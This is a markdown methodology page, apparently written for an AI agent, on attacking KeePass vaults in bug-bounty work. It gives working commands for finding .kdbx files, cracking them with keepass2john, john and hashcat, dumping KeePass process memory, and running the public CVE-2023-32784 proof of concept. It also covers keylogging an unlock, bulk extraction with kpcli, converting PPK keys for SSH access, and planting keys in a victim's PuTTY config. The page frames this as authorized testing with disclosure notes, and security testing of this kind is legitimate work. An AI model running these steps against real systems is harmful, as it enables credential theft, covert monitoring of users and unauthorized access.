---
technology: KeePass
kind: bug-bounty-methodology
audience: ai-agent
version: 1.0
family: credential-stores
evidence: "13 writeups (see ../internal coverage ledger)"
provenance: "corpus-mined from 13 writeups in the writeup corpus + upstream-verified: vdohney/keepass-password-dumper README (CVE-2023-32784 mechanics, fixed in KeePass 2.54, dump sources, typed-not-pasted, KeePass 1.x/KeePassXC/Strongbox unaffected), openwall/john src/keepass2john.c (1.x+2.x+KDBX4, -k keyfile, Argon2), PuTTY puttygen documented output modes (-O private-openssh). Accessed 2026-11-12"
---

Companion page: [[keepass|KeePass overview]] — what the manager is and where you will meet it. Tool reference notes live in the separate tools vault; Appendix A names the relevant tools in prose.

# KeePass Bug Bounty Methodology

**Scope:** KeePass/KDBX as a loot object and live target — database location, offline cracking, master-password recovery from memory (CVE-2023-32784), live capture, key files, and post-unlock loot processing including key-format conversion. **Out of scope:** generic Windows credential stores (windows-secrets unit), password managers with server components, the cracking tools' internals (tools vault).

**Authorization:** presume written permission. Keystroke capture and memory dumping of user sessions are invasive monitoring — confirm the engagement scope covers them, and treat recovered vault contents as strictly need-to-know material.

## Decision tree (one screen)

1. `.kdbx`/`.kdb` file found → Phase 2 (collect factors: key files, siblings) → Phase 3 (offline crack) in background ALWAYS.
2. KeePass/KeePassXC process observed or 2.x <2.54 suspected → Phase 4 (memory dump + CVE-2023-32784).
3. Interactive desktop on the user's session → Phase 5 (live capture / open-database access).
4. Master password or factors in hand → Phase 6 (unlock + export, kpcli for scripted extraction).
5. SSH key attachments (`.ppk`) → Phase 7 (conversion to OpenSSH).

## Phase 1 — Locating databases

```bash
# Linux foothold
find / -name '*.kdbx' -o -name '*.kdb' 2>/dev/null
# Windows foothold (PowerShell): profiles, shares, and NTFS alternate data streams
Get-ChildItem -Recurse -Filter *.kdbx C:\Users\,C:\Shares\ -ErrorAction SilentlyContinue
Get-Item C:\Users\dev\flag.txt -Stream *          # databases hide inside ADS streams
```

Habitat: user profiles (`Documents`, `Desktop`), FTP roots and team shares (`Shared.kdbx`-style names), product data directories, backup archives, and NTFS alternate data streams attached to innocuous files. Record the directory listing around every find — key files sit next to the database more often than not.

## Phase 2 — Factor collection (before any cracking)

- Siblings of the database: `*.key`, XML key files (`<KeyFile>` root element), images, documents — any file can be a key file; KeePass's own XML key format is a small wrapper around a random key.
- Reused credentials: the user's other passwords (shell history, config files, other vaults) — try them first against the vault before burning KDF time.
- Note the KDBX version (KDBX4 vs older) — it sets the crack budget in Phase 3.

## Phase 3 — Offline cracking

```bash
keepass2john vault.kdbx > vault.hash                 # add -k keyfile.key when a key file is in play
john vault.hash --wordlist=/usr/share/wordlists/rockyou.txt
# or hashcat: the keepass formats map to hashcat modes for KeePass 1.x/2.x (KDBX3 AES-KDF, KDBX4 Argon2)
```

Cost model: 1.x/KDBX3-era databases use AES-KDF and fall to GPU wordlists quickly; KDBX4 with Argon2 is memory-hard and slow per guess — prioritize targeted masks from factor collection (organization names, dates) over brute force, and run this phase in the background while working Phases 4-5. Wrong-key errors from kpcli/KeePassXC confirm format but reject the password — keep the exact error text, it distinguishes bad password from missing key file.

## Phase 4 — Master password from memory (CVE-2023-32784)

Applies to KeePass 2.x before 2.54 (fixed in 2.54; KeePass 1.x, KeePassXC, Strongbox unaffected). Preconditions: the user TYPED the master password (paste bypasses the flaw), and you can obtain memory that held the process.

```bash
# Windows: full process dump of the running KeePass (com PowerShell or Task Manager dump)
procdump -ma KeePass.exe keepass.dmp        # Sysinternals; or a found/crash dump, pagefile.sys, hiberfil.sys
# Recovery (the public PoC, a .NET tool)
git clone https://github.com/vdohney/keepass-password-dumper && cd keepass-password-dumper
dotnet run /path/to/keepass.dmp
# prints candidate characters per position; assemble: the FIRST character is not recovered — try each candidate
```

Notes: dump source can be a process dump, crash dump, pagefile/hibernation file, or full RAM capture; a LOCKED workspace does not protect it, and multiple typed passwords in one session come out as ordered candidate sets. The first character must be brute-forced or guessed from context — with the recovered tail that is cheap.

## Phase 5 — Live capture and the open database

- **Keystroke capture while the vault opens:** when a KeePass process runs on a schedule or on login (process enumeration shows it), instrument the session (keylogging tooling in scope) and wait for the next unlock — four-digit PIN-style masters and short passphrases fall immediately.
- **Open-database access:** if your foothold is in the user's interactive session (or you can reach their desktop session for GUI interception), an unlocked KeePass/KeePassXC window is a full dump — enumerate entries, note attachment names, export what the UI allows without touching the master password.

## Phase 6 — Unlock and scripted extraction

```bash
kpcli --kdb vault.kdbx                       # interactive: ls, find, show -f <entry>
kpcli --kdb vault.kdbx --key keyfile.key --command 'find .'   # scripted enumeration for reports
```

Extraction order: entries for infrastructure (domains, hosts, databases) → service and API accounts → SSH/PPK attachments → emergency/break-glass accounts. Exported attachments keep their original formats.

## Phase 7 — Key format conversion

```bash
puttygen imported_key.ppk -O private-openssh -o key.pem     # PuTTY PPK → OpenSSH PEM
chmod 600 key.pem && ssh -i key.pem user@198.51.100.10
```

Vaults on Windows hosts store PuTTY-format (`.ppk`) keys as attachments; OpenSSH client tooling wants the converted form. The reverse direction exists too (`-o` new PPK) when planting keys back into a victim's PuTTY config.

## Disclosure notes

- Name the recovery path per credential set: cracked offline vs memory-recovered (CVE-2023-32784, with the target's KeePass version) vs captured live — each carries different remediation (rotation vs upgrade to ≥2.54 vs session hardening).
- Report database locations and factor storage together: "vault in world-readable FTP root with key file beside it" is a permissions finding independent of the crack.
- KeePassXC-stored vaults are not CVE-2023-32784 targets — verify which application produced the dump before claiming the memory path.
- Vault contents disclosed in a report: list entry categories and count per category, not the secrets themselves, unless the engagement requires otherwise.

## Appendix A — Tool mapping (prose)

- **keepass2john** (John the Ripper jumbo) — hash extraction incl. `-k` key files; feeds both John and hashcat.
- **John the Ripper / hashcat** — offline cracking; pick the format/mode matching the KDBX version.
- **keepass-password-dumper** — CVE-2023-32784 PoC; consumes process/crash/pagefile/hibernation dumps, emits per-position character candidates.
- **procdump (Sysinternals) / Task Manager dump** — full-memory capture of the running KeePass process.
- **kpcli** — interactive and scripted database access post-unlock; works with key files.
- **KeePassXC** — GUI unlock/exfil of databases and attachments on Linux.
- **puttygen** — PPK ↔ OpenSSH key conversion.
- **Get-Item -Stream / dir /r** — NTFS alternate-data-stream discovery for hidden databases.
